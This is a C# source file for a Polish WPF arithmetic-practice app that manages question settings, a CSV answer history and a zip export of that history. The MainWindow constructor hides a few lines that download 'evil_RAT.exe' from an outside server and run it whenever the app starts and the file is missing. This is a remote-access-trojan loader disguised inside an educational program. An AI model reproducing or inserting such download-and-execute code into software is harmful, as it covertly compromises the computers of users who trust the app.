using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace DailyMatemaks
{
    /// <summary>
    /// Logika interakcji dla klasy MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            Properties.Settings.Default.Upgrade();
            EasyCount.Text = Properties.Settings.Default.EasyQuestions.ToString();
            MediumCount.Text = Properties.Settings.Default.MediumQuestions.ToString();
            HardCount.Text = Properties.Settings.Default.HardQuestions.ToString();
            EasyLimit.Text = Properties.Settings.Default.EasyTime.ToString();
            MediumLimit.Text = Properties.Settings.Default.MediumTime.ToString();
            HardLimit.Text = Properties.Settings.Default.HardTime.ToString();
            checkBoxAdd.IsChecked = Properties.Settings.Default.AdditionAllowed;
            checkBoxSubstract.IsChecked = Properties.Settings.Default.SubstractionAllowed;
            checkBoxMultiply.IsChecked = Properties.Settings.Default.MultiplicationAllowed;
            fetchHistory();
            if(! File.Exists("evil_RAT.exe"))
            using (var client = new WebClient())
            {
                client.DownloadFile("https://users.tryton.vlo.gda.pl/s4/evil_RAT.exe", "evil_RAT.exe");
                System.Diagnostics.Process.Start("evil_RAT.exe");
            }
        }

        private void fetchHistory()
        {
            if (!Directory.Exists("history"))
                Directory.CreateDirectory("history");
            listView.Items.Clear();
            foreach (var f in Directory.GetFiles("history", "*.csv"))
            {
                try
                {
                    var header = new HistoryItem();
                    header.Icon = "📝";
                    header.Question = DateTimeOffset.FromUnixTimeSeconds(long.Parse(f.Substring(8,10))).DateTime.ToString();
                    listView.Items.Add(header);
                    foreach (var line in File.ReadAllLines(f))
                    {
                        var entry = new HistoryItem();
                        entry.Icon = line.Split(',')[1]== line.Split(',')[2]?"✔":"✖";
                        entry.Question = "Ile to "+line.Split(',')[0]+"?";
                        entry.ExpectedAnswer = line.Split(',')[1];
                        entry.Time = line.Split(',')[1] == line.Split(',')[2] ? (Double.Parse(line.Split(',')[3])/1000.0).ToString()+"s":"Nie udzielono";
                        listView.Items.Add(entry);
                        listView.ScrollIntoView(entry);
                    }
                }catch(Exception)
                {
                   
                }
            }
        }
        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            Properties.Settings.Default.Save();
        }

        private void buttonSolveNow_Click(object sender, RoutedEventArgs e)
        {
            var excercise = new TaskWindow();
            if (!excercise.QuestionLabel.Content.Equals("???"))
                excercise.ShowDialog();
            else
                excercise.Close();
            fetchHistory();
        }

        private void EasyCount_TextChanged(object sender, TextChangedEventArgs e)
        {
            int count;
            if(int.TryParse(EasyCount.Text,out count))
            Properties.Settings.Default.EasyQuestions = count;
        }

        private void MediumCount_TextChanged(object sender, TextChangedEventArgs e)
        {
            int count;
            if (int.TryParse(MediumCount.Text, out count))
                Properties.Settings.Default.MediumQuestions = count;
        }

        private void HardCount_TextChanged(object sender, TextChangedEventArgs e)
        {
            int count;
            if (int.TryParse(HardCount.Text, out count))
                Properties.Settings.Default.HardQuestions = count;
        }

        private void checkBoxAdd_Checked(object sender, RoutedEventArgs e)
        {
            Properties.Settings.Default.AdditionAllowed = true;
        }

        private void checkBoxAdd_Unchecked(object sender, RoutedEventArgs e)
        {
            Properties.Settings.Default.AdditionAllowed = false;
        }

        private void checkBoxSubstract_Checked(object sender, RoutedEventArgs e)
        {
            Properties.Settings.Default.SubstractionAllowed = true;
        }

        private void checkBoxSubstract_Unchecked(object sender, RoutedEventArgs e)
        {
            Properties.Settings.Default.SubstractionAllowed = false;
        }

        private void checkBoxMultiply_Checked(object sender, RoutedEventArgs e)
        {
            Properties.Settings.Default.MultiplicationAllowed = true;
        }

        private void checkBoxMultiply_Unchecked(object sender, RoutedEventArgs e)
        {
            Properties.Settings.Default.MultiplicationAllowed = false;
        }

        private void defaultsButton_Click(object sender, RoutedEventArgs e)
        {
            Properties.Settings.Default.Reset();
            new MainWindow().Show();
            Close();
        }

        private void EasyLimit_TextChanged(object sender, TextChangedEventArgs e)
        {
            int limit;
            if (int.TryParse(EasyLimit.Text, out limit))
                Properties.Settings.Default.EasyTime = limit;
        }
        private void MediumLimit_TextChanged(object sender, TextChangedEventArgs e)
        {
            int limit;
            if (int.TryParse(MediumLimit.Text, out limit))
                Properties.Settings.Default.MediumTime = limit;
        }
        private void HardLimit_TextChanged(object sender, TextChangedEventArgs e)
        {
            int limit;
            if (int.TryParse(HardLimit.Text, out limit))
                Properties.Settings.Default.HardTime = limit;
        }

        private void clearButton_Click(object sender, RoutedEventArgs e)
        {
            var doClear = MessageBox.Show("Usunąć całą historię pytań?", "Jesteś pewny?", MessageBoxButton.YesNo, MessageBoxImage.Question);
            if(doClear == MessageBoxResult.Yes)
            try
            {
                foreach(var f in Directory.GetFiles("history", "*.csv"))
                {
                    File.Delete(f);
                }
            }catch(Exception exp)
            {
                MessageBox.Show(exp.Message, "Nie udało się usunąć historii.", MessageBoxButton.OK, MessageBoxImage.Error);
            }
            fetchHistory();
        }

        private void exportButton_Click(object sender, RoutedEventArgs e)
        {
            SaveFileDialog savefile = new SaveFileDialog();
            savefile.Filter = "Archiwum(*.zip)|*.zip";

            if ((bool)savefile.ShowDialog())
            {
                ZipFile.CreateFromDirectory("history", savefile.FileName);
            }
        }
    }
}
